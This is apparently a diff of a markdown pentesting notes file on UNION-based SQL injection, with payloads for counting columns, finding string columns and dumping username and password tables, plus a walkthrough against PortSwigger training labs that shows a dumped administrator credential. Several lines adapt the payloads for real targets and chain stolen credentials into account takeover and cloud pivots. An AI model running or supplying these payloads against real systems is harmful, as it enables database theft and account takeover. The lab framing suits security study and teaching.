@@ -1,4 +1,4 @@
-# SQL injection — UNION-based
+# SQL injection - UNION-based
 
 When the query's results are rendered in the response, `UNION SELECT` appends rows from any table you choose into that output. This is the fastest path from "injectable" to "full database dump". Max impact: read every readable table (creds, PII, secrets) in a handful of requests.
 
@@ -14,20 +14,20 @@ When the query's results are rendered in the response, `UNION SELECT` appends ro
 ```
 
 Decision list:
-- Results rendered as a table/list → UNION is viable.
+- Results rendered as a table/list -> UNION is viable.
 - Find column count first (ORDER BY ladder OR null-padding), then string column, then data.
 - Only one string column? Concatenate with a separator.
-- Need table/column names? → `../Examining-the-database/`.
-- 500 on every null count? Response may be too generic → fall back to blind.
+- Need table/column names? -> `../Examining-the-database/`.
+- 500 on every null count? Response may be too generic -> fall back to blind.
 
 ## Root cause
 Same as all SQLi: unparameterized concatenation in a `SELECT` whose rows reach the response body. UNION requires (1) equal column count and (2) compatible types per column between the original and injected SELECT.
 
 ## Find it (recon and detection)
 - Confirm injection (`'`, boolean pair) and that **rows are reflected** in the HTML (product list, search results, table).
-- Determine column count — two methods:
-  - **ORDER BY ladder:** `' ORDER BY 1--`, `2--`, `3--`… The first index that errors (HTTP 500 / "ORDER BY position out of range") = count+1. (Verified: `ORDER BY 4--`→500 means 3 columns.)
-  - **NULL padding:** `' UNION SELECT NULL--`, `NULL,NULL--`, … The count that returns 200/extra row matches. NULL is type-agnostic so it won't throw on type mismatch.
+- Determine column count - two methods:
+  - **ORDER BY ladder:** `' ORDER BY 1--`, `2--`, `3--`... The first index that errors (HTTP 500 / "ORDER BY position out of range") = count+1. (Verified: `ORDER BY 4--`->500 means 3 columns.)
+  - **NULL padding:** `' UNION SELECT NULL--`, `NULL,NULL--`, ... The count that returns 200/extra row matches. NULL is type-agnostic so it won't throw on type mismatch.
 - **Find a string-capable column:** place a marker string in each slot: `' UNION SELECT 'a',NULL,NULL--`, then `NULL,'a',NULL--`, etc. The slot that returns 200 **and echoes `a`** is your exfil channel. A type-incompatible slot throws `Conversion failed ... to data type int`.
 
 ## Technique
@@ -46,7 +46,7 @@ Pick a separator (`~`) absent from the data so you can split fields.
 
 **Advanced / edge cases:**
 - **Type-strict columns:** if no column accepts strings, cast: `CAST(... AS varchar)` / `... || ''`. Or fall back to error-based / blind.
-- **ORDER BY injection point:** if the injection is inside `ORDER BY`, you can't UNION directly — use the ORDER BY ladder for count, then switch technique (CASE-based blind in ORDER BY).
+- **ORDER BY injection point:** if the injection is inside `ORDER BY`, you can't UNION directly - use the ORDER BY ladder for count, then switch technique (CASE-based blind in ORDER BY).
 - **Dump many rows:** `... FROM users` returns all rows; if the page shows one row, add `LIMIT`/`OFFSET` or `WHERE` to page through, or concatenate with `STRING_AGG`/`GROUP_CONCAT`.
 - `GROUP_CONCAT(username,0x7e,password)` (MySQL) / `string_agg(username||'~'||password, ',')` (Postgres) to pull the whole table into one cell.
 
@@ -82,17 +82,17 @@ Pick a separator (`~`) absent from the data so you can split fields.
 | type mismatch | NULL for non-string slots; `CAST(x AS varchar)` for data |
 | Oracle "FROM required" | append `FROM DUAL` |
 
-## Exploitation walkthrough (dump → admin login)
-1. `GET /filter?category=Accessories' ORDER BY 1--` … `4--` → 500 at 4 ⇒ **3 columns**.
-2. `...Accessories' UNION SELECT NULL,'a',NULL--` → 200 with `a` shown ⇒ column 2 is string.
+## Exploitation walkthrough (dump -> admin login)
+1. `GET /filter?category=Accessories' ORDER BY 1--` ... `4--` -> 500 at 4 ⇒ **3 columns**.
+2. `...Accessories' UNION SELECT NULL,'a',NULL--` -> 200 with `a` shown ⇒ column 2 is string.
 3. (If names unknown) enumerate via `../Examining-the-database/`; here table=`users`, cols=`username,password`.
-4. `...x' UNION SELECT username, password FROM users--` → admin row appears in product list (verified: `administrator:qyf3s8rgihwby3v8qkyf`).
-5. Log in as administrator with the dumped password → solved.
+4. `...x' UNION SELECT username, password FROM users--` -> admin row appears in product list (verified: `administrator:qyf3s8rgihwby3v8qkyf`).
+5. Log in as administrator with the dumped password -> solved.
 
 ## Chaining
-- → [Examining-the-database](../Examining-the-database/): you almost always need it to learn table/column names first.
-- Dumped creds → [Authentication](../../Authentication/) / [Access-control](../../Access-control/) / account takeover.
-- Read secrets/API keys from config tables → pivot to [SSRF](../../SSRF/) / cloud.
+- -> [Examining-the-database](../Examining-the-database/): you almost always need it to learn table/column names first.
+- Dumped creds -> [Authentication](../../Authentication/) / [Access-control](../../Access-control/) / account takeover.
+- Read secrets/API keys from config tables -> pivot to [SSRF](../../SSRF/) / cloud.
 
 ## Tools
 - **Burp Repeater:** iterate ORDER BY / null counts and the string-slot probe by hand.
@@ -103,7 +103,7 @@ Pick a separator (`~`) absent from the data so you can split fields.
 
 ### Lab: UNION attack, determining the number of columns [Practitioner]
 - URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
-- Method: ladder `' ORDER BY n--` (or `' UNION SELECT NULL,...`) until error. Verified: ORDER BY 4 → 500, `UNION SELECT NULL,NULL,NULL--` → 200 ⇒ 3 columns. Solve = submit the matching-arity UNION.
+- Method: ladder `' ORDER BY n--` (or `' UNION SELECT NULL,...`) until error. Verified: ORDER BY 4 -> 500, `UNION SELECT NULL,NULL,NULL--` -> 200 ⇒ 3 columns. Solve = submit the matching-arity UNION.
 - Insight: an out-of-range ORDER BY index or arity mismatch throws; the boundary reveals the count.
 - Real-target transfer: on any reflected list, ladder ORDER BY until the response breaks.
 
@@ -121,13 +121,13 @@ Pick a separator (`~`) absent from the data so you can split fields.
 
 ### Lab: UNION attack, retrieving multiple values in a single column [Practitioner]
 - URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
-- Method: only one column is string-typed. `' UNION SELECT NULL, username || '~' || password FROM users--` → `administrator~<pass>`; log in. Verified.
+- Method: only one column is string-typed. `' UNION SELECT NULL, username || '~' || password FROM users--` -> `administrator~<pass>`; log in. Verified.
 - Insight: concatenate multiple fields into the single usable column with a separator.
 - Real-target transfer: when only one reflected/string column exists, concat everything you want with a delimiter.
 
 ## Real-world notes
-- UNION SQLi on a search/listing endpoint is a classic full-DB-read; CVSS High–Critical depending on data sensitivity.
-- False positive: an "extra row" that is actually the app's own empty-state — confirm your injected literal is echoed.
+- UNION SQLi on a search/listing endpoint is a classic full-DB-read; CVSS High-Critical depending on data sensitivity.
+- False positive: an "extra row" that is actually the app's own empty-state - confirm your injected literal is echoed.
 - Watch the OR-1=1 warning still applies if you reuse inputs that flow into write queries.
 
 ## References
